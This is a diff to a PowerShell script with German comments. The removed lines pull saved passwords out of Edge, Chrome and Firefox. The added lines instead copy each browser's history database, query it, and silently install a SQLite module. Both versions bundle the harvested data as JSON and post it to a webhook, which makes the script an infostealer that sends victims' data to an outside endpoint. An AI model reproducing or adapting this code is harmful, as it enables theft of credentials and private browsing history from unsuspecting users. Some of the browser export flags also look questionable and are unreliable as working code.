@@ -1,44 +1,51 @@
-# Funktion zum Exportieren von Passwörtern aus Edge
-function Export-EdgePasswords {
-    $EdgeProfilePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-    $EdgeExportPath = "$env:TEMP\edge_passwords.csv"
-    Start-Process -FilePath "msedge.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$EdgeExportPath" -Wait
-    return Import-Csv $EdgeExportPath
+function Get-EdgeHistory {
+    $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+    $EdgeTempFile = "$env:TEMP\edge_history.sqlite"
+    Copy-Item $EdgePath $EdgeTempFile -Force
+    $Query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
+    $EdgeHistory = Invoke-SqliteQuery -DataSource $EdgeTempFile -Query $Query
+    Remove-Item $EdgeTempFile
+    return $EdgeHistory
 }
 
-# Funktion zum Exportieren von Passwörtern aus Chrome
-function Export-ChromePasswords {
-    $ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-    $ChromeExportPath = "$env:TEMP\chrome_passwords.csv"
-    Start-Process -FilePath "chrome.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$ChromeExportPath" -Wait
-    return Import-Csv $ChromeExportPath
+function Get-ChromeHistory {
+    $ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    $ChromeTempFile = "$env:TEMP\chrome_history.sqlite"
+    Copy-Item $ChromePath $ChromeTempFile -Force
+    $Query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
+    $ChromeHistory = Invoke-SqliteQuery -DataSource $ChromeTempFile -Query $Query
+    Remove-Item $ChromeTempFile
+    return $ChromeHistory
 }
 
-# Funktion zum Exportieren von Passwörtern aus Firefox
-function Export-FirefoxPasswords {
-    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
-    $ExportPath = "$env:TEMP\firefox_passwords.csv"
-    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
-    
-    # Warten, bis die Datei erstellt wurde
-    Start-Sleep -Seconds 5
-    
-    return Import-Csv $ExportPath
+function Get-FirefoxHistory {
+    $FirefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    $ProfilePath = Get-ChildItem $FirefoxPath -Directory | Where-Object { $_.Name -like "*.default-release" } | Select-Object -First 1 -ExpandProperty FullName
+    $FirefoxHistoryPath = Join-Path $ProfilePath "places.sqlite"
+    $FirefoxTempFile = "$env:TEMP\firefox_history.sqlite"
+    Copy-Item $FirefoxHistoryPath $FirefoxTempFile -Force
+    $Query = "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"
+    $FirefoxHistory = Invoke-SqliteQuery -DataSource $FirefoxTempFile -Query $Query
+    Remove-Item $FirefoxTempFile
+    return $FirefoxHistory
 }
 
-# Passwörter exportieren
-$EdgePasswords = Export-EdgePasswords
-$ChromePasswords = Export-ChromePasswords
-$FirefoxPasswords = Export-FirefoxPasswords
+# Installieren des PSSQLite-Moduls, falls noch nicht vorhanden
+if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
+    Install-Module -Name PSSQLite -Force -Scope CurrentUser
+}
+Import-Module PSSQLite
 
-# Alle Passwörter kombinieren
-$AllPasswords = @($EdgePasswords) + @($ChromePasswords) + @($FirefoxPasswords)
+# Browserverlauf sammeln
+$AllHistory = @()
+$AllHistory += Get-EdgeHistory
+$AllHistory += Get-ChromeHistory
+$AllHistory += Get-FirefoxHistory
 
 # JSON-Payload erstellen
 $JsonPayload = @{
-    "passwords" = $AllPasswords
-} | ConvertTo-Json
+    "browser_history" = $AllHistory
+} | ConvertTo-Json -Depth 4
 
 # Daten an Webhook senden
 $Parameters = @{
@@ -49,8 +56,3 @@ $Parameters = @{
 }
 
 Invoke-RestMethod @Parameters
-
-# Temporäre CSV-Dateien löschen
-Remove-Item "$env:TEMP\edge_passwords.csv"
-Remove-Item "$env:TEMP\chrome_passwords.csv"
-Remove-Item "$env:TEMP\firefox_passwords.csv"
